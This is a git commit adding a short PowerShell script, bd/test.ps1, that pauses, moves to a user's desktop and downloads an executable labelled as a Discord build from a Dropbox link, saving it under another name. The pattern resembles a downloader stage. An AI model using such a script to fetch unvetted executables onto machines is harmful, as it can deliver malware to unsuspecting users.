1a22ada972859b6ca1fbc8547d060e0f96ef51ce
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-09 19:55:42 +0200

    test.ps1

---
+++ bd/test.ps1
@@ -0,0 +1,3 @@
+start-sleep 5
+cd C:/users/jbkal/desktop/
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile testen.exe
